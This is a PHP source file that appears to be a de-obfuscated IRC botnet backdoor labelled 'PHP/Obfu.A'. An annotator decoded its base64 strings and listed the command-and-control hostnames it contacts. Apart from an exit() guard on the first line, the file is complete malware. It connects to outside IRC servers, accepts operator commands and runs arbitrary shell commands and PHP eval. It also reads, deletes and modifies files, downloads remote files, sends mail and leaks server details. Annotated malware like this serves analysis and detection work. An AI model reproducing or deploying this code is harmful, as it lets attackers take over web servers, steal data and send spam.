<?php
// "PHP/Obfu.A"
// Found on Google (http://www.google.com/search?q=%24ra87deb01c5f53&num=20&hl=en&safe=off&filter=0)
// I have no clue if it runs, didn't test it, just wanted to see how it worked so I made it readable.
exit('no...');

set_time_limit(0);
ini_set("max_execution_time", 0);
set_magic_quotes_runtime(0);
ini_set('output_buffering', 0);
error_reporting(0);
ignore_user_abort();

$settings = array(
	"po" => 8080,                                           // Port
	"sp" => "uJijk4iVsIXRmQ==",                             // Server Password, secretpass
	"ch" => "aFaw",                                         // Channel, ##p
	"ke" => "spd1iYSUqA==",                                 // Channel Key, md5hash
	"ha" => "dG1qQk1halK/nE6N",                             // Admin host RegEx, /:*!*@*.av$/
	"pa" => "fpekVYhVdlWQXGLBXnBWWId1hll1WVWJVFpYh1tahVs=", // Admin password (md5 hash), 9dd4e461268c8034f5c8564e155c67a6
	"tr" => "*",                                            // Command prefix
	"mrnd" => 9,                                            // Nick/User length
	"mo" => "cqtrig==",                                     // -x+i
	"ve" => "dmFyWA=="                                      // 1.27
);

function remove_spaces($input)
{
	$input = str_replace(" ", "", $input);
	return $input;
}

function decode($input)
{
	$input = base64_decode(remove_spaces($input));
	return $input;
}

function connect()
{
	global $settings;
	$logged_in = array(
	);

	$last_line = "";
	$servers = array(
		"sqytlpaKo4a/lI6MnaWIiI+zUYSvkA==",		// mymusicband.weedns.com
		"sqywiZKPpZLTk4zDmG6aiYakkZRuhpCR",		// myphonenumber.weedns.com
		"rpihlYyTr5LWVKHDi6SRl0+jko4=",			// ieatironx.weedns.com
		"rZytgpFPr5TDlI7MmW6FiQ==",				// himan.opendns.be
		"sKJuhYdPopDTi5bHlKVRhoY=",				// ko.dd.blueline.be
		"tWeuVFZSclfDVI7CVKKPmYasjI+lUYOJ",		// p4n33123e.dd.blueline.be
		"vaOokJFUbpPOi5jClLNRhoY=",				// xphon3.opendns.be
		"sqywiZKPpVeMipjHlm6RiZU=",				// myphone3.dnip.net
		"sqytlpaKo5eMipjHlm6RiZU="				// mymusics.dnip.net
	);

	shuffle($servers);

	if (($socket = fsockopen(decrypt_settings($servers[0]), $settings['po'], $errorno, $errorstr, 15))) {
		$current_nick = generate_nick($settings['mrnd']);

		if (strlen($settings['sp']) > 0) {
			// UEFTUw==: PASS
			write_file($socket, decode("UEFTUw=="). " " . decrypt_settings($settings['sp']));
		}

		// VVNFUg==: USER
		write_file($socket, decode("VVNFUg=="). " " . generate_user($settings['mrnd']). 
			" 127.0.0.1 localhost :$current_nick");

		// TklDSw==: NICK
		write_file($socket, decode("TklDSw=="). " $current_nick");

		while (!feof($socket)) {
			$line = trim(fgets($socket, 512));
			$irc_params = explode(" ", $line);

			if (($line == $last_line))
				continue;

			// UElORw==: PING
			if (isset($irc_params[0]) && $irc_params[0] == decode("UElORw==")) {
				// UE9ORw==: PONG
				write_file($socket, decode("UE9ORw=="). " " . $irc_params[1]);
			}
			else if (isset($irc_params[1]) && $irc_params[1] == decode("MDAx")) {
				// TU9ERQ==: MODE
				write_file($socket, decode("TU9ERQ=="). " $current_nick " . decrypt_settings($settings['mo']));

				// Sk9JTg==: JOIN
				write_file($socket, decode("Sk9JTg=="). " " . decrypt_settings($settings['ch']). " " . 
					decrypt_settings($settings['ke']));
			}
			else if (isset($params[1]) && $params[1] == decode("NDMz")) {
				// TklDSw==: NICK
				write_file($socket, decode("TklDSw=="). " $current_nick");
			}
			else if (isset($irc_params[1]) && isset($logged_in[$irc_params[1]])) {
				unset($logged_in[$irc_params[1]]);
			}
			// UFJJVk1TRw==: PRIVMSG
			else if (isset($irc_params[1]) && ($irc_params[1] == decode("UFJJVk1TRw==") || $irc_params[1] == "332")) {
				$full_params = strstr($line, " :");
				$full_params = substr($full_params, 2);
				$params = explode(" ", $full_params);
				$target_host = $irc_params[0];
				$target_nick = explode("!", $target_host);
				$target_nick = substr($target_nick[0], 1);
				$silent = FALSE;

				// VkVSU0lPTg==: VERSION
				if ($params[0] == "\1" . decode("VkVSU0lPTg=="). "\1") {
					// VkVSU0lPTg==: VERSION
					write_file($socket, "NOTICE " . $target_nick . " :\1" . decode("VkVSU0lPTg=="). " " . 
						decrypt_settings($settings['ve']). "\1");
				}

				for ($i = 0; $i < count($params); $i++) {
					if ($params[$i] == "-s") {
						$silent = TRUE;
					}
				}

				if ($irc_params[1] == "332") {
					$target = $irc_params[3];
				}
				elseif ($irc_params[2] == $current_nick) {
					$target = $target_nick;
				}
				else {
					$target = $irc_params[2];
				}

				if ($params[0] == PHP_OS) {
					array_shift($params);
				}

				if (substr($params[0], 0, 1) == $settings['tr']) {
					if (isset($logged_in[$target_host]) || $irc_params[1] == "332") {
						switch (substr($params[0], 1)) {
							// sKM=: lo
							case decrypt_command("sKM="):
								if ($irc_params[1] != "332") {
									$logged_in[$target_host] = FALSE;
									
									// I'm not sure what is up with this, looks like a bug, htmen is not a function
									send_irc_message($socket, $silent, $target, htmen("b3V0"));
								}
								break;

							// qGWaoKKb: d1enow
							case decrypt_command("qGWaoKKb"):
								// UVVJVCA6SSBRVUlU: QUIT :I QUIT
								write_file($socket, decode("UVVJVCA6SSBRVUlU"));
								fclose($socket);
								exit(0);
								break;

							// tpWs: raw
							case decrypt_command("tpWs"):
								if (count($params) > 1) {
									write_file($socket, substr($full_params, strlen($params[0])));
								}
								break;

							// sKc=: ls
							case decrypt_command("sKc="):
								if (isset($params[1])) {
									$directory = $params[1];
								}
								else {
									$directory = getcwd();
								}

								if (is_dir($directory)) {
									if (($handle = opendir($directory))) {
										// RGlyLy8gTm93...: Dir// Now listing:
										send_irc_message($socket, $silent, $target, decode("RGlyLy8gTm93IGxpc3Rpbmc6"). " \2" . 
											$directory . "\2");

										while (($file = readdir($handle)) !== FALSE) {
											if ($file != "." && $file != "..") {
												send_irc_message($socket, $silent, $target, "> (" . filetype($directory . "/" . 
													$file). ") $file");
												sleep(1);
											}
										}

										closedir();
									}
									else {
										// RGlyLy8gVW5h...: Dir// Unable to list contents of
										send_irc_message($socket, $silent, $target, 
											decode("RGlyLy8gVW5hYmxlIHRvIGxpc3QgY29udGVudHMgb2Y="). " \2" . $directory . "\2");
									}
								}
								else {
									// RGlyLy8=: Dir//
									// aXMgbm90IGEgZGlyIQ==: is not a dir!
									send_irc_message($socket, $silent, $target, decode("RGlyLy8="). " \2" . $directory . "\2 " . 
										decode("aXMgbm90IGEgZGlyIQ=="));
								}
								break;

							// p5Wp: cat
							case decrypt_command("p5Wp"):
								if (count($params) > 1) {
									if (is_file($params[1])) {
										if (($file_handle = fopen($params[1], "r"))) {
											// Q0FULy8gTm93IHJlYWRpbmcgZmlsZTo=: CAT// Now reading file:
											send_irc_message($socket, $silent, $target, decode("Q0FULy8gTm93IHJlYWRpbmcgZmlsZTo="). 
												" \2" . $params[1]. "\2");

											while (!feof($file_handle)) {
												$file_line = trim(fgets($file_handle, 256));
												send_irc_message($socket, $silent, $target, "> $file_line");
												sleep(1);
											}

											send_irc_message($socket, $silent, $target, "> [EOF]");
										}
										else {
											// Q0FULy8gQ291bGRuJ3Qgb3Blbg==: CAT// Couldn't open
											send_irc_message($socket, $silent, $target, decode("Q0FULy8gQ291bGRuJ3Qgb3Blbg=="). 
												" \2" . $params[1]. "\2 for reading.");
										}
									}
									else {
										// Q0FULy8=: CAT//
										// aXMgbm90IGEgZmlsZQ==: is not a file
										send_irc_message($socket, $silent, $target, decode("Q0FULy8="). " \2" . $params[1]. "\2 " . 
											decode("aXMgbm90IGEgZmlsZQ=="));
									}
								}
								break;

							// tKuZ: pwd
							case decrypt_command("tKuZ"):
								// UFdELy8gQ3VycmVudCBkaXI6: PWD// Current dir:
								send_irc_message($socket, $silent, $target, decode("UFdELy8gQ3VycmVudCBkaXI6"). " " . getcwd());
								break;

							// p5g=: cd
							case decrypt_command("p5g="):
								if (count($params) > 1) {
									if (chdir($params[1])) {
										// Q0QvLyBDaGFuZ2VkIGRpciB0bw==: CD// Changed dir to
										send_irc_message($socket, $silent, $target, decode("Q0QvLyBDaGFuZ2VkIGRpciB0bw=="). " " . 
											$params[1]);
									}
									else {
										// Q0QvLyBGYWlsZWQgdG8gY2hhbmdlIGRpcg==: CD// Failed to change dir
										send_irc_message($socket, $silent, $target, decode("Q0QvLyBGYWlsZWQgdG8gY2hhbmdlIGRpcg=="));
									}
								}
								break;

							// tqE=: rm
							case decrypt_command("tqE="):
								if (count($params) > 1) {
									if (unlink($params[1])) {
										// Uk0vLyBEZWxldGVk: RM// Deleted
										send_irc_message($socket, $silent, $target, decode("Uk0vLyBEZWxldGVk"). " \2" . 
											$params[1]. "\2");
									}
									else {
										// Uk0vLyBGYWlsZWQgdG8gZGVsZXRl: RM// Failed to delete
										send_irc_message($socket, $silent, $target, decode("Uk0vLyBGYWlsZWQgdG8gZGVsZXRl"). 
											" \2" . $params[1]. "\2");
									}
								}
								break;

							// uKOqlZs=: touch
							case decrypt_command("uKOqlZs="):
								if (count($params) > 1) {
									if (touch($params[1])) {
										// VG91Y2gvLyBUb3VjaGVk: Touch// Touched
										send_irc_message($socket, $silent, $target, decode("VG91Y2gvLyBUb3VjaGVk"). " \2" . 
											$params[1]. "\2");
									}
									else {
										// VG91Y2gvLyBGYWlsZWQgdG8gdG91Y2g=: Touch// Failed to touch
										send_irc_message($socket, $silent, $target, decode("VG91Y2gvLyBGYWlsZWQgdG8gdG91Y2g="). 
											" \2" . $params[1]. "\2");
									}
								}
								break;

							// t62inpySoA==: symlink
							case decrypt_command("t62inpySoA=="):
								if (count($params) > 2) {
									if (symlink($params[1], $params[2])) {
										// U3ltTGluay8vIFN5bWxpbmtlZA==: SymLink// Symlinked
										send_irc_message($socket, $silent, $target, decode("U3ltTGluay8vIFN5bWxpbmtlZA=="). 
											" \2" . $params[2]. "\2 To \2" . $params[1]. "\2");
									}
									else {
										// U3ltTGluay8vIEZhaWxlZCB0byBsaW5r: SymLink// Failed to link
										send_irc_message($socket, $silent, $target, decode("U3ltTGluay8vIEZhaWxlZCB0byBsaW5r"). 
											" \2" . $params[2]. "\2 To \2" . $params[1]. "\2");
									}
								}
								break;

							// p5ykqaE=: chown
							case decrypt_command("p5ykqaE="):
								if (count($params) > 2) {
									if (chown($params[1], $params[2])) {
										// Q2hvd24vLyBDaG93bmVk: Chown// Chowned
										send_irc_message($socket, $silent, $target, decode("Q2hvd24vLyBDaG93bmVk"). 
											" \2" . $params[1]. "\2 To \2" . $params[2]. "\2");
									}
									else {
										// Q2hvd24vLyBGYWlsZWQgdG8gY2hvd24=: Chown// Failed to chown
										send_irc_message($socket, $silent, $target, decode("Q2hvd24vLyBGYWlsZWQgdG8gY2hvd24="). 
											" \2" . $params[1]. "\2 To \2" . $params[2]. "\2");
									}
								}
								break;

							// p5yioZc=: chmod
							case decrypt_command("p5yioZc="):
								if (count($params) > 2) {
									if (chmod($params[1], $params[2])) {
										// Q2htb2QvLyBDaG1vZGRlZA==: Chmod// Chmodded
										send_irc_message($socket, $silent, $target, decode("Q2htb2QvLyBDaG1vZGRlZA=="). 
											" \2" . $params[1]. "\2 with permissions \2" . $params[2]. "\2");
									}
									else {
										// Q2htb2QvLyBGYWlsZWQgdG8gY2htb2Q=: Chmod// Failed to chmod
										send_irc_message($socket, $silent, $target, decode("Q2htb2QvLyBGYWlsZWQgdG8gY2htb2Q="). 
											" \2" . $params[1]. "\2");
									}
								}
								break;

							// sZ+Zm6U=: mkdir
							case decrypt_command("sZ+Zm6U="):
								if (count($params) > 1) {
									if (mkdir($params[1])) {
										// TUtEaXIvLyBDcmVhdGVkIGRpcmVjdG9yeQ==: MKDir// Created directory
										send_irc_message($socket, $silent, $target, decode("TUtEaXIvLyBDcmVhdGVkIGRpcmVjdG9yeQ=="). 
											" \2" . $params[1]. "\2");
									}
									else {
										// TUtEaXIvLyBGYWlsZWQgdG8gY3JlYXRlIGRpcmVjdG9yeQ==: MKDir// Failed to create directory
										send_irc_message($socket, $silent, $target, 
											decode("TUtEaXIvLyBGYWlsZWQgdG8gY3JlYXRlIGRpcmVjdG9yeQ=="). " \2" . $params[1]. "\2");
									}
								}
								break;

							// tqGZm6U=: rmdir
							case decrypt_command("tqGZm6U="):
								if (count($params) > 1) {
									if (rmdir($params[1])) {
										// Uk1EaXIvLyBSZW1vdmVkIGRpcmVjdG9yeQ==: RMDir// Removed directory
										send_irc_message($socket, $silent, $target, decode("Uk1EaXIvLyBSZW1vdmVkIGRpcmVjdG9yeQ=="). 
											" \2" . $params[1]. "\2");
									}
									else {
										// Uk1EaXIvLyBGYWlsZWQgdG8gcmVtb3ZlIGRpcmVjdG9yeQ==: RMDir// Failed to remove directory
										send_irc_message($socket, $silent, $target, 
											decode("Uk1EaXIvLyBGYWlsZWQgdG8gcmVtb3ZlIGRpcmVjdG9yeQ=="). " \2" . $params[1]. "\2");
									}
								}
								break;

							// p6Q=: cp
							case decrypt_command("p6Q="):
								if (count($params) > 2) {
									if (copy($params[1], $params[2])) {
										// Q1AvLyBDb3BpZWQ=: CP// Copied
										send_irc_message($socket, $silent, $target, decode("Q1AvLyBDb3BpZWQ="). " \2" . $params[1]. 
											"\2 to \2" . $params[2]. "\2");
									}
									else {
										// Q1AvLyBGYWlsZWQgdG8gY29weQ==: CP// Failed to copy
										send_irc_message($socket, $silent, $target, decode("Q1AvLyBGYWlsZWQgdG8gY29weQ=="). " \2" . 
											$params[1]. "\2 to \2" . $params[2]. "\2");
									}
								}
								break;

							// sZWeng==: mail
							case decrypt_command("sZWeng=="):
								if (count($params) > 4) {
									$from = "From: <" . $params[2]. ">\r\n";

									if (mail($params[1], $params[3], substr($full_params, $params[4]), $from)) {
										// TWFpbC8v: Mail//
										send_irc_message($socket, $silent, $target, decode("TWFpbC8v"). " Message sent to \2" . 
											$params[1]. "\2");
									}
									else {
										// TWFpbC8v: Mail//
										send_irc_message($socket, $silent, $target, decode("TWFpbC8v"). " Send failure");
									}
								}
								break;

							// sZ+ilmg=: mkmd5
							case decrypt_command("sZ+ilmg="):
								// TUQ1Ly8=: MD5//
								send_irc_message($socket, $silent, $target, decode("TUQ1Ly8="). " " . md5($params[1]));
								break;

							// qKKo: dns
							case decrypt_command("qKKo"):
								if (isset($params[1])) {
									$ip_array = explode(".", $params[1]);

									if (count($ip_array) == 4 && is_numeric($ip_array[0]) && is_numeric($ip_array[1]) && 
										is_numeric($ip_array[2]) && is_numeric($ip_array[3])) {
										// RE5TLy8=: DNS//
										send_irc_message($socket, $silent, $target, decode("RE5TLy8="). " " . $params[1]. " -> " . 
											gethostbyaddr($params[1]));
									}
									else {
										// RE5TLy8=: DNS//
										send_irc_message($socket, $silent, $target, decode("RE5TLy8="). " " . $params[1]. " -> " . 
											gethostbyname($params[1]));
									}
								}
								break;

							// tpmoppSWqQ==: restart
							case decrypt_command("tpmoppSWqQ=="):
								// UVVJVCA6UVVJVC4uLg==: QUIT :QUIT...
								write_file($socket, decode("UVVJVCA6UVVJVC4uLg=="));
								fclose($socket);
								connect();
								break;

							// tqI=: rn
							case decrypt_command("tqI="):
								if (isset($params[1])) {
									$current_nick = generate_nick((int)$params[1]);

									// TklDSw==: NICK
									write_file($socket, decode("TklDSw=="). " $current_nick");
								}
								else {
									$current_nick = generate_nick($settings['mrnd']);

									// TklDSw==: NICK
									write_file($socket, decode("TklDSw=="). " $current_nick");
								}
								break;

							// tJyl: php
							case decrypt_command("tJyl"):
								if (count($params) > 1) {
									eval(substr($full_params, strlen($params[0])));
								}
								break;

							// q5mp: get
							case decrypt_command("q5mp"):
								if (count($params) > 2) {
									if (!($file_handle = fopen($params[2], "w"))) {
										// R2V0Ly8gUGVybWlzc2lvbiBkZW5pZWQ=: Get// Permission denied
										send_irc_message($socket, $silent, $target, 
											decode("R2V0Ly8gUGVybWlzc2lvbiBkZW5pZWQ="));
									}
									else {
										if (!($file_array = file($params[1]))) {
											// R2V0Ly8gUGVybWlzc2lvbiBkZW5pZWQ=: Get// Bad URL/DNS error
											send_irc_message($socket, $silent, $target, 
												decode("R2V0Ly8gQmFkIFVSTC9ETlMgZXJyb3I="));
										}
										else {
											for ($i = 0; $i < count($file_array); $i++) {
												fwrite($file_handle, $file_array[$i]);
											}

											// R2V0Ly8=: Get//
											send_irc_message($socket, $silent, $target, decode("R2V0Ly8="). 
												" \2" . $params[1]. "\2 downloaded to \2" . $params[2]. "\2");
										}
										fclose($file_handle);
									}
								}
								break;

							// sp0=: ni
							case decrypt_command("sp0="):
								// TmV0SW5mby8v: NetInfo//
								send_irc_message($socket, $silent, $target, decode("TmV0SW5mby8v"). " IP: " . $_SERVER['SERVER_ADDR']. 
									" Hostname: " . $_SERVER['SERVER_NAME']);
								break;

							// t50=: si
							case decrypt_command("t50="):
								// U3lzaW5mby8v: Sysinfo//
								send_irc_message($socket, $silent, $target, decode("U3lzaW5mby8v"). " [User: " . get_current_user(). 
									"] [PID: " . getmypid(). "] [Version: PHP " . phpversion(). "] [OS: " . PHP_OS . 
									"] [Server_software: " . $_SERVER['SERVER_SOFTWARE']. "] [Server_name: " . $_SERVER['SERVER_NAME']. 
									"] [Admin: " . $_SERVER['SERVER_ADMIN']. "] [Docroot: " . $_SERVER['DOCUMENT_ROOT']. "] [HTTP Host: 
									" . $_SERVER['HTTP_HOST']. "] [URL: " . $_SERVER['REQUEST_URI']. "]");
								break;

							// tKOnpqKUmuw=: portopen
							case decrypt_command("tKOnpqKUmuw="):
								if (isset($params[1], $params[2])) {
									if (fsockopen($params[1], (int)$params[2], $t56bd7107802eb, $errorstr, 5)) {
										// UG9ydENoay8v: PortChk//
										send_irc_message($socket, $silent, $target, "" . decode("UG9ydENoay8v"). " " . $params[1]. 
											":" . $params[2]. " is \2Open\2");
									}
									else {
										// UG9ydENoay8v: PortChk//
										send_irc_message($socket, $silent, $target, "" . decode("UG9ydENoay8v"). " " . $params[1]. 
											":" . $params[2]. " is \2Closed\2");
									}
								}
								break;

							// uaKWn5g=: uname
							case decrypt_command("uaKWn5g="):
								// VW5hbWUvLw==: Uname//
								send_irc_message($socket, $silent, $target, decode("VW5hbWUvLw=="). " " . php_uname());
								break;

							// rZg=: id
							case decrypt_command("rZg="):
								// SUQvLw==: ID//
								send_irc_message($socket, $silent, $target, decode("SUQvLw=="). " " . getmypid());
								break;

							// p6GZ: cmd
							case decrypt_command("p6GZ"):
								if (count($params) > 1) {
									$process_handle = popen(substr($full_params, strlen($params[0])), "r");

									while (!feof($process_handle)) {
										$output = trim(fgets($process_handle, 512));

										if (strlen($output) > 0) {
											send_irc_message($socket, $silent, $target, "> " . $output);
											sleep(1);
										}
									}

									// PiBbRU9GXQ==: > [EOF]
									send_irc_message($socket, $silent, $target, decode("PiBbRU9GXQ=="));
								}
								break;

							// qayalaiYmg==: execute
							case decrypt_command("qayalaiYmg=="):
								execute(substr($full_params, strlen($params[0])));
								break;
						}
					}
					else {
						switch (substr($params[0], 1)) {
							// bg==: *
							case decrypt_command("bg=="):
								if (isset($params[1]) && 
									md5($params[1]) == decrypt_settings($settings['pa']) && 
									preg_match(decrypt_settings($settings['ha']), $target_host)) {

									// UmVhZHkvLyBPaw==: Ready// Ok
									send_irc_message($socket, $silent, $target, decode("UmVhZHkvLyBPaw=="));
									$logged_in[$target_host] = TRUE;
								}
								else {
									// UmVhZHkvLyByZWplY3RlZA==: Ready// rejected
									send_irc_message($socket, FALSE, decrypt_settings($settings['ch']), 
										decode("UmVhZHkvLyByZWplY3RlZA=="));
								}

								break;
						}
					}
				}
			}

			$last_line = $line;
		}

		fclose($socket);
		sleep(3);
		connect();
	}
	else {
		shuffle($servers);
		connect();
	}
}

function write_file($handle, $text)
{
	fwrite($handle, "$text\r\n");
}

function send_irc_message($socket, $silent, $target, $text)
{
	if ($silent != TRUE) {
		// UFJJVk1TRw==: PRIVMSG
		write_file($socket, decode("UFJJVk1TRw=="). " $target :$text");
	}
}

function decrypt_command($input)
{
	$output = '';
	$input = base64_decode($input);

	for ($i = 0; $i < strlen($input); $i++) {
		$character = substr($input, $i, 1);
		// NDU...: 4523$5~321443425^fdGsdfG#$6@353@$5@#$5@54475&45&6%7%^^8^&*@!~#4~23432$@#!4!23$3%34%2#$5#@$5234%6%4678^&!@3D
		// Strlen: 107
		$offset_character = substr(
			decode("NDUyMyQ1fjMyMTQ0MzQyNV5mZEdzZGZHIyQ2QDM1M0AkNUAjJDVANTQ0NzUmNDUmNiU3JV5eOF4mKkAhfiM0fjIzNDM" . 
				"yJEAjITQhMjMkMyUzNCUyIyQ1I0AkNTIzNCU2JTQ2NzheJiFAM0Q="),
			($i % strlen(decode("NDUyMyQ1fjMyMTQ0MzQyNV5mZEdzZGZHIyQ2QDM1M0AkNUAjJDVANTQ0NzUmNDUmNiU3JV5eOF4mKk" . 
				"AhfiM0fjIzNDMyJEAjITQhMjMkMyUzNCUyIyQ1I0AkNTIzNCU2JTQ2NzheJiFAM0Q="))) - 1, 
			1
		);
		$character = chr(ord($character) - ord($offset_character));
		$output .= $character;
	}
	return $output;
}

function generate_nick($length)
{
	$return = '';
	
	for ($i = 0; $i < $length; $i++) {
		$return .= chr(mt_rand(0, 25) + 97);
	}
	if (posix_getegid() == 0) {
		$return = "r-" . $t2cb9df9898e55;
	}
	return $return;
}

function execute($command)
{
	$output = '';

	if (!empty($command)) {
		if (function_exists('exec')) {
			@exec($command, $output);
			$output = join("\n", $output);
		}
		elseif (function_exists('shell_exec')) {
			$output = @shell_exec($command);
		}
		elseif (function_exists('system')) {
			@ob_start();
			@system($command);
			$output = @ob_get_contents();
			@ob_end_clean();
		}
		elseif (function_exists('passthru')) {
			@ob_start();
			@passthru($command);
			$output = @ob_get_contents();
			@ob_end_clean();
		}
		elseif (@is_resource($handle = @popen($command, "r"))) {
			$output = "";

			while (!@feof($handle)) {
				$output .= @fread($handle, 1024);
			}

			@pclose($handle);
		}
	}
	return $output;
}

function decrypt_settings($input)
{
	$output = '';
	$input = base64_decode($input);

	for ($i = 0; $i < strlen($input); $i++) {
		$character = substr($input, $i, 1);
		// M0A...: 3@!#!@$^&*^&@#$!@#!@#!$#%#$%#$%e32@34@hTh4@we5635^!@#*^7FHGE$@%@#@#$@#!@#$!@#@!#$#%#$%^%&^%&%^&*SDF#@$!FAW$FAASDE
		// Strlen: 113
		$offset_character = substr(
			decode("M0AhIyFAJF4mKl4mQCMkIUAjIUAjISQjJSMkJSMkJWUzMkAzNEBoVGg0QHdlNTYzNV4hQCMqXjdGSEdFJEAlQCNAIyRAIyFAIyQhQCNAISMkIyUj" . 
				"JCVeJSZeJSYlXiYqU0RGI0AkIUZBVyRGQUFTREU="), 
			($i % strlen(decode("M0AhIyFAJF4mKl4mQCMkIUAjIUAjISQjJSMkJSMkJWUzMkAzNEBoVGg0QHdlNTYzNV4hQCMqXjdGSEdFJEAlQCNAIyRAIyFAIyQ" . 
				"hQCNAISMkIyUjJCVeJSZeJSYlXiYqU0RGI0AkIUZBVyRGQUFTREU="))) - 1,
			1
		);
		$character = chr(ord($character) - ord($offset_character));
		$output .= $character;
	}
	return $output;
}

function generate_user($length)
{
	$return = "";

	for ($i = 0; $i < $length; $i++) {
		$return .= chr(mt_rand(0, 25) + 97);
	}
	return $return;
}

connect();
?>
